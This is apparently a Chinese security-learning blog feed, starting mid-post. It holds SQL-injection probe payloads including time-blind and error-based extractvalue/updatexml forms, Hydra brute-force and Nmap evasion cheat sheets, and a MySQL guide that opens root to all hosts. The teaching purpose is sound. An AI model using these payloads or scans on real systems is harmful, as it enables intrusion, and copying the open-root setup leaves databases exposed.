惊奇的发现竟然这三种情况都不报错了，但是，这里需要注意的是，有的程序会在注入点之后加上其他参数或者用limit 0,1限制输出，所以，数字型的注入点，后面也需要加上#，即%23 此时可以发现第一种情况恢复了正常，但是还不能十分确定此注入点是否是纯数字型注入，我们还需要使用and 0 %23对页面进行测试 注：由于写的代码过于简单，在这里无法测试”and 0 %23”的情况，但在实际环境中，这是必不可少的一步 当’and 0 %23’被执行后页面正常显示，但是某些内容不显示，则可以基本确定此注入点类型为纯数字型，payload为and 1 %23 继续对第2,3这两种情况测试，加右括号： 可以看到第二种情况恢复了正常，则可以判断此注入点是数字+括号型，payload为and 1) %23 继续对第3种情况测试，再加一个右括号： 可以看到第三种情况恢复了正常，则可以判断此注入点是数字+双括号型，payload为and 1)) %23 到此，单引号和数字型的所有情况都被测试出来了，接下来，来看看双引号型注入点的构造吧！ 第三种：双引号输入一个双引号： 在上面输入单引号时，这三种情况都没有报错，现在三种情况都报错了，我们继续，在后面加入%23查看是否有变化： 由此可以判断双引号注入点的payload为：&quot;%23 继续测试第8,9这两种情况，添加右括号： 由此可以判断双引号+括号注入点的payload为：&quot;)%23 只剩下最后一种情况还报错，再添加一个右括号： 由此可以判断双引号+双括号注入点的payload为：&quot;))%23 其他至此，上述9种情况基本包含了所有存在注入的注入点的类型，但是可能有的人会发现，你的页面在最开始就没有任何变化，上面所有办法都试了，却没有任何变化，这是因为还存在一种注入，是基于时间的盲注，针对这种情况，可以在上述9种payload中%23之前加入sleep(6)判断页面是否一直加载了大概6秒以上，由此来判断是否存在时间盲注，针对这种情况，本文不深入探讨。 结语在测试注入点的过程中，一定不能忘了hackbar这个好工具，简直是SQL注入利器，如果你看的似懂非懂，请拿本篇文章和玄学图片去尝试判断一下sql-labs的前10关分别是什么注入类型，相信你会有收获的！ 本文演示所用代码：请搜索名为“show-sql”的文件，下载后添加后缀名为php 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hydra命令速查]]></title>
    <url>%2F2018%2F12%2F30%2F%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E5%90%88%E8%BE%91%2F</url>
    <content type="text"><![CDATA[Hydra1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253-R继续从上一次的进度开始破解-S大写，采用SSL链接-s&lt;PORT&gt;小写，可通过这个参数指定非默认端口-l&lt;LOGIN&gt;指定破解的用户，对特定用户破解-L&lt;FILE&gt;指定用户名字典-p&lt;PASS&gt;小写，指定密码破解，少用，一般是采用密码字典-P&lt;FILE&gt;大写，指定密码字典-e&lt;ns&gt;可选选项，n：空密码试探，s：使用指定用户和密码试探-C&lt;FILE&gt;使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数-M&lt;FILE&gt;指定目标列表文件一行一条-o&lt;FILE&gt;指定结果输出文件-f在使用-M参数以后，找到第一对登录名或者密码的时候中止破解-t&lt;TASKS&gt;同时运行的线程数，默认为16-w&lt;TIME&gt;设置最大超时的时间，单位秒，默认是30s-v /-V显示详细过程server目标ipservice指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm]imap[-ntlm] smb smbnt http[s]-&#123;head|get&#125; http-&#123;get|post&#125;-form http-proxy ciscocisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhereteamspeak sip vmauthd firebird ncp afp等等 参考暴力破解工具Hydra 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>hydra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NMAP速查手册]]></title>
    <url>%2F2018%2F12%2F30%2FNMAP%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C%2F</url>
    <content type="text"><![CDATA[参数常用参数 -sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。-sS 半开扫描，一般不会记入日志，不过需要root权限。-sU udp扫描，但是一般不可靠，-sA 用来穿过防火墙的规则集，速度慢。-sV 端口服务及版本-A 包含了-sV，-O，全面系统检测，启动脚本检测，扫描等。-P0 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。-v 显示扫描进程-O 探测目标系统的漏洞，容易误报-oN/-oX/-oG 将报告写入文件，格式分别为正常（自定义.txt）,XML,grepable.-iL 扫描主机列表-sC –script=default 默认的脚本扫描，主要是搜集各种应用服务的信息 主机发现 -sL 仅仅是显示,扫描的IP数目,不会进行任何扫描-sn ping扫描,即主机发现-Pn 不检测主机存活-PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list] 使用IP协议包探测对方主机是否开启-n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析 扫描技巧 -sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU UDP扫描-sN/sF/sX TCP Null，FIN，and Xmas扫描–scanflags 自定义TCP包中的flags-sI zombie host[:probeport] Idlescan-sY/sZ SCTP INIT/COOKIE-ECHO 扫描-sO 使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host” 使用FTP bounce scan 指定端口和扫描顺序 -p 特定的端口 -p80,443 或者 -p1-65535-p U:PORT 扫描udp的某个端口, -p U:53-F 快速扫描模式,比默认的扫描端口还少-r 不随机扫描端口,默认是随机扫描的–top-ports “number” 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个–port-ratio “ratio” 扫描指定频率以上的端口 服务版本识别 -sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测–version-intensity “level” 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7–version-light 打开轻量级模式,为–version-intensity 2的别名–version-all 尝试所有探测,为–version-intensity 9的别名–version-trace 显示出详细的版本侦测过程信息 脚本扫描 -sC 根据端口识别的服务,调用默认脚本–script=”Lua scripts” 调用的脚本名–script-args=n1=v1,[n2=v2] 调用的脚本传递的参数–script-args-file=filename 使用文本传递参数–script-trace 显示所有发送和接收到的数据–script-updatedb 更新脚本的数据库–script-help=”Lua script” 显示指定脚本的帮助 OS识别 -O 启用操作系统检测,-A来同时启用操作系统检测和版本检测–osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)–osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配 防火墙/IDS躲避和哄骗 -f; –mtu value 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME 使用诱饵隐蔽扫描-S IP-ADDRESS 源地址欺骗-e interface 使用指定的接口-g/ –source-port PROTNUM 使用指定源端口–proxies url1,[url2],… 使用HTTP或者SOCKS4的代理 –data-length NUM 填充随机数据让数据包长度达到NUM–ip-options OPTIONS 使用指定的IP选项来发送数据包–ttl VALUE 设置IP time-to-live域–spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装–badsum 使用错误的checksum来发送数据包 Nmap 输出 -oN 将标准输出直接写入指定的文件-oX 输出xml文件-oS 将所有的输出都改为大写-oG 输出便于通过bash或者perl处理的格式,非xml-oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v 提高输出信息的详细度-d level 设置debug级别,最高是9–reason 显示端口处于带确认状态的原因–open 只输出端口状态为open的端口–packet-trace 显示所有发送或者接收到的数据包–iflist 显示路由信息和接口,便于调试–log-errors 把日志等级为errors/warings的日志输出–append-output 追加到指定的文件–resume FILENAME 恢复已停止的扫描–stylesheet PATH/URL 设置XSL样式表，转换XML输出–webxml 从namp.org得到XML的样式–no-sytlesheet 忽略XML声明的XSL样式表 其他 -6 开启IPv6-A OS识别,版本探测,脚本扫描和traceroute–datedir DIRNAME 说明用户Nmap数据文件位置–send-eth / –send-ip 使用原以太网帧发送/在原IP层发送–privileged 假定用户具有全部权限–unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限-V 打印版本信息-h 输出帮助 参考文中内容摘自Nmap速查手册 Nmap官方中文手册Nmap中文手册 Nmap入门Nmap扫描原理与用法 简单粗暴获得所有帮助1nmap --help 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows和Linux下搭建VPN]]></title>
    <url>%2F2018%2F12%2F30%2FWindows%E5%92%8CLinux%E4%B8%8B%E6%90%AD%E5%BB%BAVPN%2F</url>
    <content type="text"><![CDATA[Windows Server 2008安装路由与远程访问按照图片上的来，没有截图的界面就选择下一步： 安装网络策略和访问服务 配置并启用路由和远程访问 新增接口 添加用户 添加用户，自定义名字vpntest 网络安全策略 本地安全策略 输入之前创建用户时的自定义名字vpntest 连接测试 输入创建用户时的用户名和密码： ok Ubuntu 18在linux里有一种特别棒的项目，叫docker，功能就相当于VMware workstation，可以安装虚拟镜像，但是docker不对硬件进行虚拟化，所以运行起来会特别的快，关于docker，github上有详细的介绍，易懂，在接下来安装VPN之前，我将先介绍如何安装docker，随后用docker安装VPN 安装docker我用的Termius连接的ubuntu，在这里面复制粘贴相对简单 更新apt源要更新的源的地址 1https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 备份原有的源 1cp /etc/apt/sources.list /etc/apt/sources.list.backup 修改apt源 123456打开vi /etc/apt/sources.list`dd`删除复制清华的源放入保存，退出 更新 1sudo apt-get update 使用apt安装由于 apt 源使用 HTTPS 以确保软件下载过程中不被篡改。因此，我们首先需要添加使用 HTTPS 传输的软件包以及 CA 证书 12345sudo apt-get install \ apt-transport-https \ ca-certificates \ curl \ software-properties-common 为了确认所下载软件包的合法性，需要添加软件源的 GPG 密钥 1curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add - 然后，我们需要向 source.list 中添加 Docker 软件源 1234sudo add-apt-repository \ &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; 安装 Docker CE更新 apt 软件包缓存，并安装 docker-ce： 123sudo apt-get updatesudo apt-get install docker-ce 镜像加速国内从 Docker Hub 拉取镜像有时会遇到困难，此时可以配置镜像加速器。Docker 官方和国内很多云服务商都提供了国内加速器服务 Ubuntu 16.04+、Debian 8+、CentOS 7在 /etc/docker/daemon.json 中写入如下内容 12345&#123; &quot;registry-mirrors&quot;: [ &quot;https://registry.docker-cn.com&quot; ]&#125; 注意，一定要保证该文件符合 json 规范，否则 Docker 将不能启动 重启docker 1service docker restart 验证是否安装成功 1docker -v 检查加速是否生效配置加速器之后，如果拉取镜像仍然十分缓慢，请手动检查加速器配置是否生效，在命令行执行 docker info，如果从结果中看到了如下内容，说明配置成功 12Registry Mirrors: https://registry.docker-cn.com/ 针对非ROOT用户请执行如下命令 123sudo groupadd dockersudo usermod -aG docker $&#123;USER&#125; 重新登录 docker使用说明网上有人总结的很好，如果有不懂可以随时翻阅 1https://yeasy.gitbooks.io/docker_practice/content/image/pull.html 搭建VPN本次搭建的是PPTP模式的VPN，用到的镜像是mobtitude/vpn-pptp 下载镜像 1docker pull mobtitude/vpn-pptp 在当前路径新建文件，文件名随意，我的命名为：chap-secrets，内容为： 1name * pass * 执行如下命令，注意-v后:前你的路径和文件名是否和我的一致 123docker run -d --privileged -p 1723:1723 -v /root/chap-secrets:/etc/ppp/chap-secrets mobtitude/vpn-pptp执行成功的结果是显示一长串字符 之后就可以连接进行测试了，和上面Windows的一样 如果连接不成功，可以试试下面的命令，在此之前，需要删除正在运行的容器 12停止所有容器docker stop $(docker ps -qa) 12删除所有容器docker rm $(docker ps -qa) 执行命令，注意-v后:前你的路径和文件名是否和我的一致 1docker run -d --privileged --net host -v /root/chap-secrets:/etc/ppp/chap-secrets mobtitude/vpn-pptp 完事儿~~ 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>vpn,docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP协议与HTTP协议]]></title>
    <url>%2F2018%2F12%2F25%2FTCPIP%E5%8D%8F%E8%AE%AE%E4%B8%8EHTTP%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[TCP/IP协议与HTTP协议一、TCP/IP协议TCP/IP协议，也称TCP/IP协议族或TCP/IP协议栈，其中： TCP：Transmission Control Protocol 传输控制协议IP： Internet Protocol 互联网协议 该协议是目前世界上应用最为广泛的协议，是以TCP和IP为基础的不同层次上多个协议的集合，两台主机要实现通讯，都必须遵守TCP/IP协议。 以下是ISO/OSI七层模型与TCP/IP四层模型对比： 区别： 1、前者是七层模型结构，后者是四层模型结构； 2、实际市场应用不同， ISO/OSI参考模型只是理论上的模型，并没有成熟的产品支持；而TCP/IP参考模型已经成为“实际上的国际标准”。 五层协议与四层协议基本相同，只不过是将网络接口层分开为物理层和数据链路层。 二、TCP三次握手和四次挥手三次握手首先看一张图片 在学习TCP协议的“三次握手”之前，先来了解TCP报文及格式：当应用层向TCP层发送用于网间传输的、用8位字节表示的数据流时，TCP会把数据流分割成适当长度的报文段，之后TCP把数据包传给IP层，由它来通过网络将包传送给接收端实体的TCP层。 三次握手流程1.第一次握手：主机A将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给主机B，主机A进入SYN_SENT状态，等待主机B确认。 第二次握手：主机B收到数据包后由标志位SYN=1得知主机A请求建立连接，主机B将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给主机A以确认连接请求，主机B进入SYN_RCVD状态。 3.第三次握手：主机A收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给主机B，主机B检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，主机A和主机B进入ESTABLISHED状态，完成三次握手，随后就可以开始传输数据了 四次挥手 在了解4次挥手之前我们要知道为什么建立连接时是3次，而关闭时却是4次呢？ 这是因为服务端的LISTEN状态下的SOCKET当收到SYN报文的连接请求后，它可以把ACK和SYN(ACK起应答作用，而SYN起同步作用)放在 一个报文里来发送。但关闭连接时，当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了；但未必你所有的数据都全部发送给对方了，所以你可能 未必会马上会关闭SOCKET,也即你可能还需要发送一些数据给对方之后，再发送FIN报文给对方来表示你同意现在可以关闭连接了，所以它这里的ACK报 文和FIN报文多数情况下都是分开发送的。 （1）第一次挥手：客户端发送一个FIN，用来关闭客户端到服务器的数据传送，客户端进入FIN 1状态。 （2）第二次挥手：服务器收到FIN后，发送一个ACK给客户端，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），客户端进入CLOSE_WAIT状态。 （3）第三次挥手：服务器发送一个FIN，用来关闭服务器到客户端的数据传送，服务器进入LAST_ACK状态。 （4）第四次挥手：客户端收到FIN后，进入TIME_WAIT状态，接着发送一个ACK给服务器，确认序号为收到序号+1，进入CLOSED状态，完成四次挥手。 常用端口1234567891011121314151617181920212223242526272829303132333435363721 FTP22 SSH23 Telnet25 SMTP80 http110 pop3135 smb443 https445 共享服务1433 sql server1531 oracle3306 mysql3389 rdp远程桌面5432 postgresql6379 redis7001weblogic8080 tomcat10051 zabbix27017 mongodb 二、HTTP协议HTTP协议作用在应用层，属于应用层协议。 HTTP状态码 200 - 请求成功 301 - 资源（网页等）被永久转移到其它URL 404 - 请求的资源（网页等）不存在 500 - 内部服务器错误 | 200 | OK | 请求成功。一般用于GET与POST请求 || —- | ——————— | ———————————————————— || 400 | Bad Request | 客户端请求的语法错误，服务器无法理解 || 403 | Forbidden | 服务器理解请求客户端的请求，但是拒绝执行此请求 || 404 | Not Found | 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面 || 405 | Method Not Allowed | 客户端请求中的方法被禁止 || 500 | Internal Server Error | 服务器内部错误，无法完成请求 || 502 | Bad Gateway | 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 | HTTP之URL 常用URL编码123456&apos; %27&quot; %22# %23空格 %20% %25+ %2b HTTP之请求消息Request 举例： GET / HTTP/1.1 Host: 192.168.11.111:8000 Accept: / //换行 HTTP请求方法主要是GET和POST请求 GET请求举例 POST请求举例 HTTP请求头和响应头请求头： User-Agent ；浏览器的标识信息 Accept 发送的数据类型（一般有text，json,xml） Accept-Language 浏览器使用的语言 Accept-Encoding 指浏览器向中间件发送数据是使用的压缩方式 Host 访问的网站域名+端口 Cookie 网站认证信息 响应头： Date 日期时间 这个时间为GTM时间，和我们的utc时间差8个小时 Set-Cookie cookie的来源（给网站设置Cookie） Content-Type 告诉浏览器返回的内容格式 Serve 显示中间件的版本信息 X-Forwarded-By 使用的脚本语言 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>tcp,ip,http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP连接MySQL]]></title>
    <url>%2F2018%2F12%2F22%2FPHP%E8%BF%9E%E6%8E%A5MySQL%2F</url>
    <content type="text"><![CDATA[PHP操作MySQL数据库文中所讲不适用于实际场景，仅适用于本地练习，如有问题，后果自负 我把这个过程分成了两大块：连接和操作 连接 1234567写好配置信息，诸如：host、db_name、db_user、db_pwd等信息建立连接选择要操作的数据库设置请求和返回数据的字符集 通常我喜欢把连接这部分写入单独的文件中，每次使用时，只需要在其他页面调用即可 1include &apos;conf.php&apos;; 操作 1234567构造SQL语句执行SQL语句，如果有错，则报错从结果集中取出一行并返回关闭连接 使用mysqli扩展使用mysqli扩展需要配置php.ini配置文件中的 1extension_dir = &quot;你的php.exe的存放路径\ext&quot;; 12删除下面这句话前面的英文分号`;`;extension=php_mysqli.dll 之后重启服务即可 注：下图中$mysqli为连接的conf.php中的第二步建立连接的结果 12345678910111213141516171819202122232425include &apos;conf.php&apos;;#1.构造SQL语句，查找content表中id为1的记录$sql = &quot;SELECT * FROM content WHERE id = 1&quot;;#2.执行SQL语句$res = $mysqli-&gt;query($sql);#如果语句本身有错，则报错 if (!$res)&#123; die(&quot;SQL语句出错！&quot;.$mysqli-&gt;error); &#125;#3.fetch_assoc()从结果集中取出一行以关联数组形式返回并用foreach输出while($row = $res-&gt;fetch_assoc())&#123; foreach ($row as $key=&gt;$value)&#123; echo $key.&apos;=&apos;.$value; &#125;&#125;#4.关闭连接#mysqli-&gt;close(); 使用mysql扩展此扩展只支持PHP版本5.5以下，所以就不赘述了 使用PDO技术（防止SQL注入）操作步骤： 1234567891011121314151617181920211.配置信息2.创建PDO对象3.执行SQL语句，编码4.构造SQL语句，在变化的地方使用`?`5.编译预处理6.传值，绑定7.执行SQL语句8.判断语句9.从结果集中取出一行并返回10.输出11.关闭连接 代码实现： 123456789101112131415161718192021222324252627282930313233343536&lt;?php$mysqli_conf = array( &apos;host&apos; =&gt; &apos;127.0.0.1:3306&apos;, &apos;db_user&apos; =&gt; &apos;root&apos;, &apos;db_pwd&apos; =&gt; &apos;root&apos;, &apos;db_name&apos; =&gt; &apos;test&apos;);//创建一个PDO对象$dsn = &quot;mysql:host=127.0.0.1&quot;;$dbuser = &apos;root&apos;;$dbpass = &apos;root&apos;;$pdo = new PDO($dsn,$dbuser,$dbpass);//执行SQL语句，编码$pdo-&gt;exec(&quot;set names &apos;utf8&apos;&quot;);//构造SQL语句，在变化的地方使用?$sql = &quot;select * from content where id = ?&quot;;#编译预处理$stmt = $pdo-&gt;prepare($sql);#传值，绑定$stmt-&gt;bindValue(1,&apos;1&apos;,PDO::PARAM_STR); 第一个`1`指的是第一个`?`，第二个`1`是问号的内容#执行SQL语句$rs = $stmt-&gt;execute();#如果为真if ($rs)&#123; #PDO::FETCH_ASSOC 关联数组形式 #PDO::FETCH_NUM 数字索引形式 #从结果集中取出一行并返回 while($row = $stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123; #输出 echo &quot;&lt;pre&gt;&quot;; var_dump($row); echo &quot;&lt;/pre&gt;&quot;; &#125;&#125;#关闭连接$pdo = null; 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>php,mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库基础知识笔记]]></title>
    <url>%2F2018%2F12%2F22%2Fmysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[数据库数据库即存储数据的仓库，是一个管理数据的软件 数据库模型 关系型数据库（也称结构化数据库） MySQL：轻量级开源数据库，适用于中小型企业，性能较好 MSSQL(SQL server)：微软开发的，适用于中大型企业，需要微软系统作为支撑，不支持跨平台 Oracle：收费，适用于大型企业的需求，支持跨平台，需要良好的硬件配置作为支撑 DB2 …… 非关系型数据库（也称非结构化数据库） redis、mongodb、Hbase、nosql等 关系型数据库结构 数据库：可以看成是一个“文件柜”中的“小格子” 数据表：可以看成是一个具体的“文件” 记录、字段、数据 一行，即一条记录 一列，即一个字段 行列交叉处，即数据 MySQL登录和退出登录MySQL有两种方式，一种是通过命令行登录进行操作，一种是通过工具登录进行操作，下面介绍通过DOS命令行进行登录 配置环境变量如果想在任意位置登录MySQL，则需要配置环境变量，如何判断是否配置好，可通过查看MySQL版本的命令进行判断： 1mysql -V #切记是大写的`V` 如果出现如下情况即没有配置好： 1‘mysql -V 不是内部或外部命令，也不是可运行的程序或批处理文件。 接下来进行配置，win7路径如下： 1win7--&gt;计算机--&gt;属性--&gt;高级系统设置--&gt;高级--&gt;环境变量--&gt;系统变量--&gt;Path 大差不差，网上教程很多，配一下就完事儿了，此处省略**字 登录在DOS命令行中，执行以下命令： 1mysql -h 主机名 -u 用户名 -p 密码 -h：代表MySQL数据库主机名。本地主机名如：127.0.0.1。MySQL数据库默认端口号：3306 -u：代表MySQL用户名。如：root -p：代表MySQL密码。如：root。在登录时，可以先不输入密码值 如： 1mysql -h127.0.0.1 -uroot -proot 退出1exit 重置密码如果忘记密码，莫慌，老夫看你骨骼惊奇，这个重置密码的方法，就赐予你了： phpstudy重置数据库密码：1其他选项菜单--&gt;mysql工具--&gt;重置密码 Linux（centos7）修改root密码： MySQL版本低于8： 1234567891011121.修改配置文件：vi /etc/my.cnf 添加：skip-grant-tables 重启MySQL服务2.空密码登录： mysql -uroot3.改密码：update mysql.user set authentication_string=password(‘root&apos;),plugin=&apos;mysql_native_password&apos; where user=&apos;root&apos; and host=&apos;localhost&apos;;4.更新数据库：flush privileges;5.退出6.再次修改配置文件，注释掉skip-grant-tables，重启MySQL服务，即可 MySQL版本为8及以上： 这里改的是初始密码 1234567891.查看原始密码：(两种方法) 1). grep &quot;password&quot; /var/log/mysqld.log 2). cat /var/log/mysqld.log | grep &quot;password&quot; 2.使用原始密码登录： mysql -uroot -p3.执行命令： ALTER USER &quot;root&quot;@&quot;localhost&quot; IDENTIFIED BY &quot;你的密码&quot;;4.重启服务即可 重置过密码后忘记密码 123456789101112131415161.修改配置文件：vi /etc/my.cnf 添加：skip-grant-tables 重启MySQL服务2.空密码登录： mysql -uroot3.清空:authentication_string字段,设置对应的host:%update user set host=&apos;%&apos; where user=&apos;root&apos;;update user set authentication_string=&apos;&apos; where user=&apos;root&apos;4.退出exit5.修改配置文件，注释掉步骤一，重启MySQL服务6.空密码登录： mysql -uroot7.alter user&apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;你的密码@123&apos;; 允许外界连接的方法 改表法 123456789进入MySQL，执行以下命令：首先要能远程访问，修改root的host为%update user set host=&apos;%&apos; where user=&apos;root&apos;;GRANT ALL ON *.* TO &apos;root&apos;@&apos;%&apos;;其次，修改连接方式：ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED WITH mysql_native_password BY &apos;你的数据库密码&apos;;注意修改防火墙规则或者关闭防火墙 授权法 1天将降大任于斯人也，enmmmmmm...交给你去研究了 数据类型1234567891011121314整型 INT浮点型 FLOAT日期 DATE YYYY-MM-DD时间 TIME HH-MM-SS时间戳 TIMESTAMP字符 CHAR VARCHAR 文本 TEXT MySQL数据库操作在MySQL交互式环境中，所有命令必须以英文分号;结束 MySQL不区分大小写，但是把系统命令和自定义值以大小写区分会便于查看和排错 显示数据库1SHOW DATABASES; 创建数据库12交互式环境： CREATE DATABASE [IF NOT EXISTS] 数据库名 [CHARSET UTF8];DOS命令行： mysqladmin -uroot -proot CREATE DATABASE 数据库名; IF NOT EXISTS：可选项，如果不存在，则创建数据库 数据库名：自定义 CHARSET：设置数据库的默认字符集 删除数据库1DROP DATABASE [IF EXISTS] 数据库名; 查看数据库的字符集1SHOW CREATE DATABASE 数据库名; 通过MySQL命令修改数据库的字符集 1ALTER DATABASE 数据库名 DEFAULT CHARACTER SET gbk; MySQL数据表操作选择数据库只有进入数据库里，才能操作数据表 1USE 数据库名; 显示当前库中所有的数据表1SHOW TABLES; 创建数据表1CREATE TABLE 表名(字段1 字段1类型 字段1属性,字段2 字段2类型 字段2属性,……) 字段类型：tinyint、int、bigint、char、varchar、text、date、time等 字段属性： NOT NULL|NULL：是否可以为空 DEFAULT default_value：指该列的默认值 default_value默认值可以是字符串，也可以是整型 AUTO_INCREMENT：该列为自动增长型，或者自动编号。要求该列必须是整型。一个表只能有一个auto_increment属性。 PRIMARY KEY：主键。指定该列的值具有唯一性，主键所在的列不能为空。一个表的主键只能有一个。 一个数据表，由多个列构成。多个列定义之间用英文下的逗号隔开。 删除数据表1DROP TABLE [IF EXISTS] table_name; 修改数据表 这么麻烦的语句，你要用吗？删了在创建一个不就完事儿了 describe显示表的结构定义1DESCRIBE 表名; 或 DESC 表名; SQL基础增删改查增加记录1INSERT INTO 表名(字段1,字段2,字段3,…) VALUES (值1,值2,值3,…) 删除记录1DELETE FROM 表名 [WHERE 条件] WHERE条件：如果省略，将删除所有记录 修改记录1UPDATE 表名 SET 字段1 = 新值1，字段2=新值2,… [WHERE条件] 需要更新的字段列出，不需要更新的不用管它 字段的顺序可以修改 WHERE条件不能省略，如果省略，所有记录都会修改 查询记录1SELECT 字段列表|* FROM 表名 [WHERE条件] [ORDER BY排序][LIMIT限制输出] 字段字列表：查询某些字段的数据，各字段之间用逗号隔开，字段之间没有顺序 ：表示显示所有列的数据。如：select from news; where：指查询的条件 ORDER BY：字段排序 LIMIT：限制输出 条件判断WHERE 123SELECT * FROM news WHERE id&lt;100;SELECT * FROM news WHERE id&lt;100 and hits&lt;100;SELECT * FROM news WHERE id=100 OR hits&lt;50; ORDER BY123order by n 如果后面跟数字，是按照第n列数据排序，如果n超过字段数，就报错ERROR 1054 (42S22): Unknown column &apos;5&apos; in &apos;order clause&apos; 由此可判断此表有几列 LIMIT 限制输出1LIMIT startrow,pagesize; startrow从指定的行数起，开始返回数据 pagesize返回的记录数 举例： 123LIMIT 0,10; //从第0行起，返回10条记录LIMIT 10,10; //从第10行起，返回10条记录LIMIT 20,10; //从第20行起，返回10条记录 LIKE12345通配符： * 表示任意的字符 % 表示任意的字符 ？ 表示一个字符SELECT * FROM 表名 WHERE 字段名 LIKE &apos;字符串&apos;; 其中字符串可用通配符 UNION 联合查询1SELECT 字段列表|* FROM 表1 UNION SELECT 字段列表|* FROM 表2; 表1和表2中字段数应相同 DISTINCT 去重1SELECT DISTINCT field FROM table_name [WHERE 条件]； GROUP_CONCAT 把查询结果链接一起1SELECT group_concat(DISTINCT field) FROM table_name [WHERE 条件] ； 常用函数 数据库信息类 12345678910111213141516171819version() 显示数据库版本信息connection_id() 显示当前连接数user() 当前用户（current_user()、system_user()、session_user()）database() 查看当前使用的数据库schema() 查看当前使用的数据库@@hostname 获取当前计算机名称@@tmpdir 存放临时文件的路径@@datadir 存放数据的路径@@version 数据库版本@@basedir 数据库所在位置 字符串操作类 123456789101112131415161718mid(string,start,length) 用来截取字符串中一部分SUBSTRING（str,start,length） 把str从start个字符开始截取length个字符，并输出ord() 用来显示字符的ASCII码concat() 拼接字符串concat_ws() 使用分隔符来拼接字符串第一个参数是分隔符，支持16进制，不能用单双引号包括 group_concat() 和concat类似，拼接并分组显示数据INSERT(str1,start,length,str2) 把str1的第start个字符往后的length个字符替换为str2 LEFT(str,length) 把str从左边开始截取length个字符并输出RIGHT(str,length) 把str从右边开始截取length个字符并输出 其他 1SLEEP(5) 让服务器等待5秒后返回0 报错函数 extractvalue 12345extractvalue(XML_document，XPath_string): 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) 作用：从目标XML中返回包含所查询值的字符串 select * from news where tid=1 and extractvalue(1,concat(0x7e,(select user()),0x7e)); UPDATEXML 123456UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 select * from news where tid=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 导入导出数据导入数据123451.mysql命令导入 mysql -uroot -proot &lt; 文件路径2.source命令导入3.使用 LOAD DATA 导入数据 导出数据 第一种方法 1SELECT * FROM 表名 INTO OUTFILE &quot;路径+文件名&quot;; 如果出错，以下为解决办法： 12ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement 123456789101112131415执行命令（查看相关配置）：SHOW 